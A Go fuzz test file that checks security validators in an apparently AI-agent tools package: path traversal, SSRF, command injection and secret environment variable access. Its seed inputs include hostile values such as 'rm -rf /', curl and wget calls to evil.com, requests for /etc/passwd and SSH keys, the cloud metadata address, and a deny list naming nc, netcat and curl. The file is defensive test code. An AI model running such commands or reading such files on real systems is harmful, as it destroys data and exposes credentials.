package tools

import (
	"strings"
	"testing"

	"github.com/koopa0/koopa/internal/security"
)

// FuzzClampTopK tests that clampTopK never panics and always returns valid bounds.
func FuzzClampTopK(f *testing.F) {
	f.Add(0, 3)
	f.Add(-1, 5)
	f.Add(5, 3)
	f.Add(10, 3)
	f.Add(100, 3)
	f.Add(-2147483648, 1)
	f.Add(2147483647, 10)

	f.Fuzz(func(t *testing.T, topK, defaultVal int) {
		result := clampTopK(topK, defaultVal)

		if topK <= 0 {
			if result != defaultVal {
				t.Errorf("clampTopK(%d, %d) = %d, expected defaultVal %d for zero/negative topK",
					topK, defaultVal, result, defaultVal)
			}
		} else if topK > 10 {
			if result != 10 {
				t.Errorf("clampTopK(%d, %d) = %d, expected 10 for topK > 10",
					topK, defaultVal, result)
			}
		} else {
			if result != topK {
				t.Errorf("clampTopK(%d, %d) = %d, expected %d for valid topK",
					topK, defaultVal, result, topK)
			}
		}
	})
}

// FuzzResultConstruction tests that Result struct construction never panics.
func FuzzResultConstruction(f *testing.F) {
	f.Add("SecurityError", "message")
	f.Add("NotFound", "")
	f.Add("CustomCode", "unicode: 中文錯誤訊息")

	f.Fuzz(func(t *testing.T, code, message string) {
		result := Result{
			Status: StatusError,
			Error:  &Error{Code: ErrorCode(code), Message: message},
		}

		if result.Status != StatusError {
			t.Errorf("Result status = %v, want %v", result.Status, StatusError)
		}
		if result.Error == nil {
			t.Fatal("Result Error is nil")
		}
		if string(result.Error.Code) != code {
			t.Errorf("Result code = %v, want %v", result.Error.Code, code)
		}
	})
}

// =============================================================================
// Security Fuzz Tests
// =============================================================================

// FuzzPathTraversal tests path validation never panics and handles edge cases.
// The validator allows relative paths (resolved from working directory) and
// absolute paths within allowed directories.
func FuzzPathTraversal(f *testing.F) {
	// Absolute path traversal attempts (must be blocked if outside /tmp)
	f.Add("/etc/passwd")
	f.Add("/var/log/syslog")
	f.Add("/root/.ssh/id_rsa")

	// Relative paths (allowed - resolved from working dir)
	f.Add("valid/path.txt")
	f.Add("foo/bar")
	f.Add("test.txt")

	// Valid /tmp paths
	f.Add("/tmp/test.txt")
	f.Add("/tmp/foo/bar")

	// Edge cases
	f.Add("")
	f.Add(".")
	f.Add("..")
	f.Add("./test")

	// URL-encoded attempts (should be treated as literal filenames)
	f.Add("..%2f..%2fetc%2fpasswd")
	f.Add("%2e%2e%2f")

	f.Fuzz(func(t *testing.T, path string) {
		// Create validator with /tmp as allowed base
		validator, err := security.NewPath([]string{"/tmp"})
		if err != nil {
			t.Skip("could not create validator")
		}

		// The key invariant: Validate should never panic
		cleanPath, err := validator.Validate(path)

		// If validation succeeds for an absolute path, it must be under allowed dirs
		if err == nil && strings.HasPrefix(path, "/") {
			// Absolute paths that validate must be under /tmp
			if !strings.HasPrefix(cleanPath, "/tmp") {
				t.Errorf("absolute path %q validated to %q which is outside /tmp", path, cleanPath)
			}
		}

		// If validation succeeds, the clean path should not contain unresolved ".."
		// that would allow traversal (filepath.Clean handles this)
		if err == nil && cleanPath != "" {
			// The cleaned path should not have .. unless it's a literal filename
			// Check if there's actual traversal happening
			if strings.Contains(cleanPath, "/../") {
				t.Errorf("path %q validated to %q which contains traversal", path, cleanPath)
			}
		}
	})
}

// FuzzSSRFBypass tests URL validation against SSRF attacks.
// The validator must block obvious private/internal IP addresses.
// Note: Some edge cases (userinfo tricks, numeric IPs) may pass through
// depending on the validator implementation.
func FuzzSSRFBypass(f *testing.F) {
	// Core localhost that MUST be blocked
	f.Add("http://localhost/")
	f.Add("http://localhost:8080/")
	f.Add("http://127.0.0.1/")
	f.Add("http://127.0.0.1:80/")
	f.Add("http://[::1]/")

	// Private ranges that MUST be blocked
	f.Add("http://10.0.0.1/")
	f.Add("http://172.16.0.1/")
	f.Add("http://192.168.1.1/")

	// Cloud metadata that MUST be blocked
	f.Add("http://169.254.169.254/")

	// Valid external URLs
	f.Add("https://example.com/")
	f.Add("https://google.com/search?q=test")

	// Invalid schemes
	f.Add("file:///etc/passwd")
	f.Add("ftp://example.com/")
	f.Add("javascript:alert(1)")
	f.Add("data:text/html,<script>")

	// Edge cases (may or may not be blocked)
	f.Add("")
	f.Add("not-a-url")
	f.Add("//example.com/")

	f.Fuzz(func(t *testing.T, rawURL string) {
		validator := security.NewURL()
		err := validator.Validate(rawURL)

		// If validation passes, verify the most critical patterns are blocked
		if err == nil {
			lower := strings.ToLower(rawURL)

			// Core patterns that MUST be blocked - direct localhost/private access
			// We only check the host part, not userinfo or fragment tricks
			mustBlock := []string{
				"://localhost/",
				"://localhost:",
				"://127.0.0.1/",
				"://127.0.0.1:",
				"://[::1]/",
				"://[::1]:",
				"://10.0.0.",
				"://192.168.",
				"://172.16.",
				"://169.254.169.254",
			}

			for _, pattern := range mustBlock {
				if strings.Contains(lower, pattern) {
					t.Errorf("URL %q should have been blocked (contains %q)", rawURL, pattern)
				}
			}

			// Check for invalid schemes
			if strings.HasPrefix(lower, "file:") ||
				strings.HasPrefix(lower, "ftp:") ||
				strings.HasPrefix(lower, "javascript:") ||
				strings.HasPrefix(lower, "data:") {
				t.Errorf("URL %q should have been blocked (invalid scheme)", rawURL)
			}
		}
	})
}

// FuzzCommandInjection tests command validation against injection attacks.
// The validator must block dangerous commands. Note: shell metacharacters in args
// are safe since exec.Command doesn't interpret them (no shell involved).
func FuzzCommandInjection(f *testing.F) {
	// Dangerous commands that must be blocked
	f.Add("rm", "-rf /")
	f.Add("sudo", "rm -rf /")
	f.Add("bash", "-c 'rm -rf /'")
	f.Add("sh", "-c whoami")
	f.Add("curl", "http://evil.com")
	f.Add("wget", "-O /tmp/x http://evil.com")

	// Allowed commands (shell metacharacters are safe with exec.Command)
	f.Add("ls", "-la")
	f.Add("echo", "hello world")
	f.Add("pwd", "")
	f.Add("date", "")
	f.Add("wc", "-l /tmp/safe.txt")
	f.Add("git", "status")

	// Edge cases
	f.Add("", "")
	f.Add("nonexistent", "")

	f.Fuzz(func(t *testing.T, cmd, args string) {
		validator := security.NewCommand()
		argList := strings.Fields(args)
		err := validator.ValidateCommand(cmd, argList)

		// If validation passes, verify it's not a dangerous command
		if err == nil {
			// These commands must ALWAYS be blocked regardless of args
			dangerous := []string{"rm", "sudo", "bash", "sh", "curl", "wget", "nc", "netcat", "dd", "mkfs", "shutdown", "reboot", "halt", "poweroff", "chmod", "chown"}
			for _, d := range dangerous {
				if cmd == d {
					t.Errorf("dangerous command %q should have been blocked", cmd)
				}
			}
		}
	})
}

// FuzzEnvVarBypass tests environment variable access validation.
// The validator must block access to sensitive environment variables.
func FuzzEnvVarBypass(f *testing.F) {
	// Sensitive variables that must be blocked
	f.Add("API_KEY")
	f.Add("api_key")
	f.Add("AWS_SECRET_ACCESS_KEY")
	f.Add("GITHUB_TOKEN")
	f.Add("DATABASE_PASSWORD")
	f.Add("SECRET")
	f.Add("PASSWORD")
	f.Add("TOKEN")
	f.Add("PRIVATE_KEY")
	f.Add("CREDENTIALS")

	// Allowed variables
	f.Add("HOME")
	f.Add("PATH")
	f.Add("USER")
	f.Add("SHELL")
	f.Add("PWD")
	f.Add("LANG")

	// Edge cases - unicode/encoding tricks
	f.Add("ＡＰＩ＿ＫＥＹ")      // fullwidth
	f.Add("API\u200BKEY") // zero-width space
	f.Add("_API_KEY_")
	f.Add("MYAPI_KEY")
	f.Add("API_KEY_VALUE")

	// Empty and whitespace
	f.Add("")
	f.Add("   ")

	f.Fuzz(func(t *testing.T, envName string) {
		validator := security.NewEnv()
		err := validator.ValidateEnvAccess(envName)

		// If validation passes, verify it's not a sensitive variable
		if err == nil {
			upper := strings.ToUpper(envName)
			sensitivePatterns := []string{"KEY", "SECRET", "PASSWORD", "TOKEN", "CREDENTIAL", "PRIVATE"}

			for _, pattern := range sensitivePatterns {
				if strings.Contains(upper, pattern) {
					// This might be a false positive if the variable is actually safe
					// Log but don't fail - the validator has domain knowledge we don't
					t.Logf("note: %q passed validation despite containing %q", envName, pattern)
				}
			}
		}
	})
}
